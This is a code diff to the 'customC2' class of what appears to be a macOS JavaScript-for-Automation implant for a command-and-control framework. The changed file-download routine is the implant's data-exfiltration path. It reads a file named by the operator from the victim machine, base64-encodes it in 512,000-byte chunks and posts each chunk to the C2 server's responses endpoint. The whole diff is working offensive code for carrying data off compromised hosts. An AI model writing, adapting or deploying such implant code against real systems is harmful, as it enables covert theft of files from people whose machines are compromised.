@@ -114,7 +114,8 @@ class customC2 extends baseC2{
         // download just has one parameter of the path of the file to download
         if( does_file_exist(params)){
             var offset = 0;
-            var chunkSize = 350000; //3500;
+            var url = "api/v1.0/responses/" + task.id;
+            var chunkSize = 512000; //3500;
             var handle = $.NSFileHandle.fileHandleForReadingAtPath(params);
             // Get the file size by seeking;
             var fileSize = handle.seekToEndOfFile;
@@ -122,7 +123,8 @@ class customC2 extends baseC2{
             var numOfChunks = Math.ceil(fileSize / chunkSize);
             var registerData = JSON.stringify({'total_chunks': numOfChunks, 'task': task.id});
             var registerData = convert_to_nsdata(registerData);
-            var registerFile = this.postResponse(task, registerData);
+            var registerFile = this.htmlPostData(url, JSON.stringify({"response": registerData.base64EncodedStringWithOptions(0).js}));
+            //var registerFile = this.postResponse(task, registerData);
             if (registerFile['status'] == "success"){
                 handle.seekToFileOffset(0);
                 var currentChunk = 1;
@@ -131,7 +133,8 @@ class customC2 extends baseC2{
                     // send a chunk
                     var fileData = JSON.stringify({'chunk_num': currentChunk, 'chunk_data': data.base64EncodedStringWithOptions(0).js, 'task': task.id, 'file_id': registerFile['file_id']});
                     fileData = convert_to_nsdata(fileData);
-                    this.postResponse(task, fileData);
+                    this.htmlPostData(url, JSON.stringify({"response": fileData.base64EncodedStringWithOptions(0).js}))
+                    //this.postResponse(task, fileData);
                     $.NSThread.sleepForTimeInterval(this.interval);
 
                     // increment the offset and seek to the amount of data read from the file
